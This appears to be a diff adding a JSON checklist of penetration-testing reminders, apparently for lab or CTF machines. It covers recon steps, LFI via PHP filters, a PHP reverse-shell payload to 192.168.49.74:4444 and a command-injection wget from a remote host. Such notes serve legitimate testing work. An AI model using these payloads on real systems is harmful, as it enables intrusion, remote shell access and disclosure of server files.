@@ -1,0 +1,25 @@
+{
+  "todos": [
+    "Checked for UDP open ports?",
+    "Checked for other protocols with nmap?",
+    "Checked for robots.txt",
+    "Inspect SSL certificates?",
+    "Wordpress with https? Did you teste with *--disable-tls-checks* flag?",
+    "Gobuster failing with https? Did you teste with *-k* flag?",
+    "If PHP, can be extract data using PHP Filters?",
+    [
+        "`?page=php://filter/convert.base64-encode/resource=config`",
+        "`?page=php://filter/convert.base64-encode/resource=config/../index`"
+    ],
+    "If a LFI was reading a page name like: ?view=dog, try:",
+    [
+        "`view=./dog../index`",
+        "`%00 at the end`",
+        "`?file=<?php exec(\"/bin/bash -c 'bash -I >& /dev/tcp/192.168.49.74/4444 0>&1'\"); ?>`",
+        "`url.com/file.php[?path=/]`",
+        "`?path=/;wget http://$remote_ip:$remote_port/<file>.<ext>`"
+    ],
+    "Checked for subdomains?",
+    "Checked for fuzzing parameters?"
+  ]
+}
